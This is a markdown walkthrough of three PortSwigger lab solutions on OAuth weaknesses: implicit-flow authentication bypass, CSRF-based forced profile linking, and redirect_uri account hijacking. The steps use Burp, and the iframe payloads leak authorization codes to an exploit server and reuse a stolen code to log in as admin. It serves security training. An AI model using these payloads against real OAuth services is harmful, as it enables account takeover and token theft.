<!-- omit in toc -->
# Oauth authentication

<!-- omit in toc -->
## Table of Contents

- [Authentication bypass via OAuth implicit flow](#authentication-bypass-via-oauth-implicit-flow)
- [Forced OAuth profile linking](#forced-oauth-profile-linking)
- [OAuth account hijacking via redirect_uri](#oauth-account-hijacking-via-redirect_uri)

## Authentication bypass via OAuth implicit flow
Reference: https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow

<!-- omit in toc -->
### Solution
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that make up the OAuth flow. This starts from the authorization request ``GET /auth?client_id=[...]``.
3. Notice that the client application (the blog website) receives some basic information about the user from the OAuth service. It then logs the user in by sending a POST request containing this information to its own ``/authenticate`` endpoint, along with the access token.
4. Send the POST ``/authenticate`` request to Burp Repeater. In Repeater, change the email address to ``carlos@carlos-montoya.net`` and send the request. Observe that you do not encounter an error.
5. Right-click on the ``POST`` request and select "Request in browser" > "In original session". Copy this URL and visit it in your browser. You are logged in as Carlos and the lab is solved.

## Forced OAuth profile linking
Reference: https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

<!-- omit in toc -->
### Quick Solution
The trick to solve this lab is use Burp Proxy to forward requests until intercepting the one for ``GET /oauth-linking?code=<code>``. This request has to be dropped to ensure that the code remains valid. Then a malicious webpage can be crafted to abuse the *Attach social profile* function and attach the social profile of a normal user to the administrator account.

<!-- omit in toc -->
### Solution
1. While proxying traffic through Burp, click "My account". You are taken to a normal login page, but notice that there is an option to log in using your social media profile instead. For now, just log in to the blog website directly using the classic login form.
2. Notice that you have the option to attach your social media profile to your existing account.
3. Click "Attach a social profile". You are redirected to the social media website, where you should log in using your social media credentials to complete the OAuth flow. Afterwards, you will be redirected back to the blog website.
4. Log out and then click "My account" to go back to the login page. This time, choose the "Log in with social media" option. Observe that you are logged in instantly via your newly linked social media account.
5. In the proxy history, study the series of requests for attaching a social profile. In the ``GET /auth?client_id[...]`` request, observe that the ``redirect_uri`` for this functionality sends the authorization code to ``/oauth-linking``. Importantly, notice that the request does not include a ``state`` parameter to protect against CSRF attacks.
6. Turn on proxy interception and select the "Attach a social profile" option again.
7. Go to Burp Proxy and forward any requests until you have intercepted the one for ``GET /oauth-linking?code=[...]``. Right-click on this request and select "Copy URL".
8. Drop the request. This is important to ensure that the code is not used and, therefore, remains valid.
9. Turn off proxy interception and log out of the blog website.
10. Go to the exploit server and create an ``iframe`` in which the ``src`` attribute points to the URL you just copied. The result should look something like this:
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
```
11. Deliver the exploit to the victim. When their browser loads the ``iframe``, it will complete the 12. OAuth flow using your social media profile, attaching it to the admin account on the blog website.
Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the admin user. Go to the admin panel and delete Carlos to solve the lab.

## OAuth account hijacking via redirect_uri
Reference: https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

<!-- omit in toc -->
### Quick Solution
For this lab we just have to mess around with the ``redirect_uri`` parameter to get the **authorization code** of the ``admin`` user and then use it to complete the authentication flow.

<!-- omit in toc -->
### Solution
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself.
3. In Burp, study the OAuth flow in the proxy history and identify the **most recent** authorization request. This should start with ``GET /auth?client_id=[...]``. Notice that when this request is sent, you are immediately redirected to the redirect_uri along with the authorization code in the query string. Send this authorization request to Burp Repeater.
4. In Burp Repeater, observe that you can submit any arbitrary value as the ``redirect_uri`` without encountering an error. Notice that your input is used to generate the redirect in the response.
5. Change the ``redirect_uri`` to point to the exploit server, then send the request and follow the redirect. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. This confirms that you can leak authorization codes to an external domain.
6. Go back to the exploit server and create the following ``iframe`` at ``/exploit``:
```
<iframe src="https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
```
7. Store the exploit and click "View exploit". Check that your ``iframe`` loads and then check the exploit server's access log. If everything is working correctly, you should see another request with a leaked code.
8. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
9. Log out of the blog website and then use the stolen code to navigate to:
```
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
```
The rest of the OAuth flow will be completed automatically and you will be logged in as the admin user. Open the admin panel and delete Carlos to solve the lab.